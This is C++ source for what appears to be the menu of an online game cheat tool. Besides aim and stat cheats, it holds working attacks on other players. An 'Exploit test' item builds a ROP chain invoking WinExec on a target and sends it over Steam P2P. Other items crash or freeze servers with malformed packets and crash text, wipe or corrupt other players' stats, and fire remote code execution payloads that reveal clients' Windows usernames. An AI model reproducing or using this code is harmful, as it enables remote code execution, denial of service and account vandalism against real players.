						ImGui::InputTextWithHint("##shader_name", "Material", &shader_name);

						ImGui::SetNextItemWidth(width * 0.45f);
						ImGui::InputTextWithHint("##player_name", "Name", &player_name);

						ImGui::SameLine();

						if (ImGui::Button("Set##set_player_name"))
						{
							if (const auto args = utils::string::split(shader_name, ' '); !args.empty() && args.size() > 3)
							{
								const Vec2 dimensions =
								{
									std::strtof(args[1].data(), nullptr),
									std::strtof(args[2].data(), nullptr)
								};

								steam::persona_name = game::CL_AddMessageIcon(args[0], dimensions, std::stoi(args[3]));

							}
							else
							{
								steam::persona_name = player_name;
							}
						}
					}
					
					if (begin_section("Field of view"))
					{
						const auto fov_step = 1.0f;

						ImGui::SetNextItemWidth(width * 0.20f);
						ImGui::InputScalar("##field_of_view", ImGuiDataType_Float, &misc::fov_value, &fov_step, nullptr, "%.0f");

						misc::fov_value = std::fminf(std::fmaxf(misc::fov_value, 65.0f), 120.0f);
					}

					ImGui::Checkbox("Third person mode", &misc::third_person);
					ImGui::Checkbox("Log out-of-band packets", &network::log_packets);
					ImGui::Checkbox("Log SV commands", &server_command::log_sv_commands);
					
					ImGui::Checkbox("Never host", &misc::never_host);

					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("Remove flinch", &misc::no_flinch);
						ImGui::Checkbox("Remove kick angles", &misc::no_recoil);
						ImGui::Checkbox("Remove spread", &nospread::enabled);
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Host"))
				{
					if (ImGui::CollapsingHeader("Host", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Spawn bots"))
						{
							ImGui::SetNextItemWidth(width * 0.15f);

							static auto bot_input = 1u;
							const auto bot_step = 1u;

							ImGui::InputScalar("##bot_input", ImGuiDataType_S32, &bot_input, &bot_step, nullptr, "%u");
							bot_input = std::min(std::max(bot_input, 0u), 17u);

							if (in_game && hosting)
							{
								ImGui::SameLine(0.0f, spacing);

								if (ImGui::Button("Spawn", { -320.0f, 0.0f }))
								{
									for (auto i = 0u; i != bot_input; ++i)
									{
										scheduler::once(bots::add_bot, scheduler::pipeline::renderer, 100ms * i);
									}
								}
							}
						}

						ImGui::Separator();

						if (begin_section("Client stats"))
						{
							if (ImGui::MenuItem("Derank", nullptr, false, in_game && hosting))
							{
								for (int i = 0; i < 18; ++i)
								{
									scheduler::once([=]()
									{
										stats::set_player_data(i, "prestige", "0");
										stats::set_player_data(i, "experience", "0");
									}, scheduler::pipeline::server, 500ms * i);
								}
							}

							if (ImGui::MenuItem("Brick classes", nullptr, false, in_game && hosting))
							{
								for (int i = 0; i < 18; ++i)
								{
									scheduler::once([=]()
									{
										for (size_t j = 0; j < 15; ++j)
										{
											const auto material = game::CL_AddMessageIcon("postfx"); 
											
											stats::set_player_data(i, "customClasses", std::to_string(i), "name", material);

											if (i < 5)
												stats::set_player_data(i, "privateMatchCustomClasses", std::to_string(i), "name", material);
										}
									}, scheduler::pipeline::server, 500ms * i);
								}
							}
						}

						ImGui::Separator();

						if (ImGui::MenuItem("Exploit test", nullptr, false))
						{
							//game::send_server_command_crashes();

							const auto target_xuid = game::Live_GetXuid(0); 
							
							exploit::rop::rop_chain chain{};
							chain.write_data(UNUSED_DATA_0, "WinExec");
							chain.write_data(UNUSED_DATA_1, "cmd /c start deez");
							chain.call_function(&win_exec_stub, SW_SHOW);
							chain.push(0x004172DE);
							chain.push(0x0013F8F0 + 1248);

							char data[0x800] = { 0 };
							std::memcpy(data, chain.data(), chain.size());
							
							*(int*)&data[1204] = 0x004172DE; //pop esp ret
							*(int*)&data[1208] = 0x0013F8F0; //stack at start of our buffer
							
							steam::networking->SendP2PPacket(target_xuid, data, 1240, k_EP2PSendReliable, 0);
						}
					}
					
					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Server"))
				{
					if (ImGui::CollapsingHeader("Game info", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::MenuItem(("Lobby ID: " + std::to_string(game::Steam_GetSteamLobbyID())).data(), "Click to copy lobby ID");

						if (ImGui::IsItemClicked())
						{
							ImGui::LogToClipboardUnformatted(std::to_string(game::Steam_GetSteamLobbyID()).data());
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}

						const auto netadr_ip_string = utils::string::adr_to_string(&party->currentHost.adr);
						ImGui::MenuItem(("Server IP: "s + netadr_ip_string).data(), "Click to copy IP address");

						if (ImGui::IsItemClicked())
						{
							ImGui::LogToClipboardUnformatted(netadr_ip_string.data());
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}
					}

					if (ImGui::CollapsingHeader("Game settings", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Map"))
						{
							ImGui::SetNextItemWidth(width * 0.35f);
							static std::pair<std::string, std::string> map = { map_names.begin()->first, map_names.begin()->second };

							if (ImGui::BeginCombo("##map_name", map.second))
							{
								for (const auto& map_name : map_names)
								{
									ImGui::PushID(map_name.second);

									if (ImGui::Selectable(map_name.second))
									{
										map = { map_name.first, map_name.second };
									}

									ImGui::PopID();
								}

								ImGui::EndCombo();
							}

							ImGui::SameLine(0.0f, spacing);

							if (ImGui::Button("Set##set_map_name"))
							{
								if (hosting)
									game::set_map(map.first);
								else
									exploit::member_join::send_payload("map", { map.first });
							}
						}
						
						if (begin_section("Gravity"))
						{
							const auto gravity_step = 1u;

							ImGui::SetNextItemWidth(width * 0.20f);
							ImGui::InputScalar("##gravity_input", ImGuiDataType_S32, &host::gravity, &gravity_step, nullptr, "%u");

							host::gravity = std::min(std::max(host::gravity, 0u), 9999u);

							ImGui::SameLine(0, spacing);

							if (ImGui::Button("Set##set_gravity"))
							{
								if (hosting)
									utils::hook::set<std::uint32_t>(0x004F9BB3 + 0x3, host::gravity);
								else
									exploit::member_join::send_payload("gravity", { std::to_string(host::gravity) });
							}
						}
						
						if (begin_section("Movement speed"))
						{
							const auto movement_step = 1u;

							ImGui::SetNextItemWidth(width * 0.20f);
							ImGui::InputScalar("##movement_speed_input", ImGuiDataType_S32, &host::movement_speed, &movement_step, nullptr, "%u");

							host::movement_speed = std::min(std::max(host::movement_speed, 0u), 2000u);

							ImGui::SameLine(0, spacing);

							if (ImGui::Button("Set##set_movement_speed"))
							{
								if (hosting)
									utils::hook::set<std::uint32_t>(0x004F93D7 + 0x3, host::movement_speed);
								else
									exploit::member_join::send_payload("speed", { std::to_string(host::movement_speed) });
							}
						}

						if (begin_section("Jump height"))
						{
							const auto jump_height_step = 1.0f;

							ImGui::SetNextItemWidth(width * 0.20f);
							ImGui::InputScalar("##jump_height_input", ImGuiDataType_Float, &host::jump_height, &jump_height_step, nullptr, "%.0f");

							host::jump_height = std::fminf(std::fmaxf(host::jump_height, 0.0f), 9999.0f);

							ImGui::SameLine(0, spacing);

							if (ImGui::Button("Set##set_jump_height"))
							{
								if (hosting)
									utils::hook::set<float>(0x007E1AA0, host::jump_height);
								else
									exploit::member_join::send_payload("jumpheight", { std::to_string(host::jump_height) });
							}
						}

						if (begin_section("Lobby slots"))
						{
							const auto lobby_slots_step = 1u;

							ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x * (1.0f / 5));
							ImGui::InputScalar("##lobby_slots", ImGuiDataType_S32, &game::party->private_slots(), &lobby_slots_step, nullptr, "%u");
							game::party->private_slots() = std::min(game::party->private_slots(), 18u);
						}
						
						ImGui::Checkbox("Force host", &host::force_host);
						ImGui::Checkbox("Unlimited ammo", &host::unlimited_ammo);
						ImGui::Checkbox("Anti-leave", &host::anti_leave);

						if (ImGui::Selectable("Max bullet penetration"))
						{
							if (game::perk_bullet_penetration_multiplier->current.value == 2.0f)
							{
								game::perk_bullet_penetration_multiplier->current.value = 1.0f;
								PRINT_BOLD_MESSAGE("Increased penetration!");
							}
							else
							{
								game::perk_bullet_penetration_multiplier->current.value = 2.0f;
								PRINT_BOLD_MESSAGE("Decreased penetration!");
							}

							exploit::member_join::send_payload("penetration");
						}
						
						if (ImGui::Selectable("Make game unlimited"))
						{
							const auto gametype = game::Dvar_FindVar("g_gametype")->current.string;
							const auto command = utils::string::va("scr_%s_timelimit 0;scr_%s_scorelimit 0;scr_%s_winlimit 0;scr_%s_numlives 0\n", gametype, gametype, gametype, gametype);

							if (hosting)
								game::Cbuf_AddText(0, command);
							else
								exploit::member_join::send_payload("cbuf", { command });
						}
						
						if (ImGui::MenuItem("End game"))
						{
							game::Cbuf_AddText(0, ("mr " + std::to_string(game::server_id) + " -1 endround").data());
						}

						if (ImGui::MenuItem("Send crash text"))
						{
							scheduler::once([]()
							{
								game::Cbuf_AddText(0, utils::string::va("say \"%s\"", game::CL_AddMessageIcon("postfx", { 1.f, 1.f }, false).data()));
								std::this_thread::sleep_for(1500ms);
								game::Cbuf_AddText(0, utils::string::va("say \"%s\"", game::CL_AddMessageIcon("gfx_laser", { 1.f, 1.f }, false).data()));
								std::this_thread::sleep_for(1500ms);
								game::Cbuf_AddText(0, "say \"^\x01==\xFF\"");
								std::this_thread::sleep_for(1500ms);
								game::Cbuf_AddText(0, "say \"^\x01==\x1D\"");
								std::this_thread::sleep_for(1500ms);
								game::Cbuf_AddText(0, "say \"^\x01\"");

							}, scheduler::pipeline::async);
						}

						if (ImGui::Selectable("Migrate host"))
						{
							if (hosting)
								game::Cbuf_AddText(0, "hostmigration_start\n");
							else
								exploit::member_join::send_payload("migrate");
						}

						if (ImGui::Selectable("Freeze server##freeze_server"))
						{
							for (size_t i = 0; i < 127; ++i)
							{
								scheduler::once([]()
								{
									if (game::CL_IsLocalClientInGame())
									{
										char netchan_data[2048] = { 0 };
										std::memset(netchan_data, 0x80, sizeof netchan_data);

										game::CL_Netchan_Transmit(game::netchan(), netchan_data, sizeof netchan_data);
									}
								}, scheduler::pipeline::main, 1ms * i);
							}
						}

						if (ImGui::Selectable("Crash server##crash_server"))
						{
							exploit::send_relay_crash_packet(party, game::party->currentHost.adr);
							exploit::send_print_packet(game::party->currentHost.adr, "^\x01==\x80");
						}

						static auto callvote_input = ""s; 
						
						if (ImGui::MenuItem("Callvote", nullptr, false, in_game && !callvote_input.empty()))
						{
							game::send_server_command(-1, "d 3876 " + callvote_input);
							game::send_server_command(-1, "d 3875 1 " + std::to_string(game::server_id));
						}

						ImGui::SetNextItemWidth(width * 0.85f);
						ImGui::InputTextWithHint("##callvote_input", "Callvote Message", &callvote_input);
					}

					if (ImGui::CollapsingHeader("RCE Exploits", ImGuiTreeNodeFlags_Leaf))
					{
						if (ImGui::MenuItem("Say Windows username for clients", nullptr, nullptr, in_game))
						{
							exploit::replace_directive::send_payload(-1, "say_username");
						}
						
						const auto rce_cmd = get_rce_commands(width); 
						
						if (ImGui::MenuItem("Execute"))
						{
							if (auto args = utils::string::split(rce_cmd.first, ' '); !args.empty())
							{
								exploit::member_join::send_payload(rce_cmd.second, args);
							}
							else
							{
								exploit::member_join::send_payload(rce_cmd.second);
							}
						}
					}
					
					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Extras"))
				{
					if (ImGui::CollapsingHeader("Stats", ImGuiTreeNodeFlags_Leaf))
					{
						static auto prestige_input = stats::get_player_data("prestige");
						const auto prestige_step = 1u;

						if (begin_section("Edit Prestige"))
						{
							ImGui::SetNextItemWidth(width * 0.20f);
							ImGui::InputScalar("##prestige_input", ImGuiDataType_S32, &prestige_input, &prestige_step, nullptr, "%u");
							prestige_input = std::min(std::max(prestige_input, 0), 11);
						}

						ImGui::SameLine();

						if (ImGui::Button("Set##set_prestige"))
						{
							stats::set_prestige(prestige_input);
						}

						ImGui::SameLine();

						ImGui::Checkbox("Cycling prestige", &misc::cycling_prestige);

						if (ImGui::Button("Unlock all", { -370, 0 }))
						{
							stats::unlock_all();
						}

						ImGui::SameLine(0.0f, spacing);

						ImGui::HelpMarker("Unlock all titles, callsigns, weapons, camos, and attachments");
					}
					
					if (ImGui::CollapsingHeader("Tools", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Execute command"))
						{
							static auto command_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##command_input", "Command", &command_input);

							ImGui::SameLine();

							if (ImGui::Button("Execute##execute_command", { 64.0f, 0.0f }))
							{
								game::Cbuf_AddText(0, (command_input + '\n').data());
							}
						}
						
						if (begin_section("Send server command"))
						{
							static auto sv_command_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##sv_command_input", "Command", &sv_command_input);

							ImGui::SameLine();

							if (ImGui::Button("Send##send_server_command", { 64.0f, 0.0f }))
							{
								game::send_server_command(-1, sv_command_input);
							}
						}

						if (begin_section("Join game via lobby ID"))
						{
							static auto lobby_id_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##lobby_id_input", "Lobby ID", &lobby_id_input);

							ImGui::SameLine();

							if (ImGui::Button("Join##join_via_lobby_id", { 64.0f, 0.0f }))
							{
								game::Steam_JoinLobby(utils::atoll(lobby_id_input), false);
							}
						}

						if (ImGui::MenuItem("Get info from clients"))
						{
							static std::vector<uint64_t> players{};

							for (size_t i = 0; i < 18; ++i)
							{
								if (!game::user_is_registered(party, i))
									continue;
								
								const auto xuid = party->partyMembers[i].player;

								if (std::find(players.begin(), players.end(), xuid) == players.end())
									players.push_back(xuid);
							}

							for (const auto& player : players)
							{
								const auto result = reinterpret_cast<bool(*)(uint64_t)>(0x0063AB60)(player);

								if (result)
								{
									steam::get_p2p_session_state(player);
								}
							}
						}
					}
					
					ImGui::EndTabItem();
				}

				player_list(); 
				session::session_list();
			}
		}
	}

	void initialize(IDirect3DDevice9* device)
	{
		if (!initialized)
		{
			initialized = true;

			rendering::dx::on_frame(device);
			input::on_key(VK_F1, toggle, true);

			setup_material_pool();
			setup_map_names();
		}
	}
}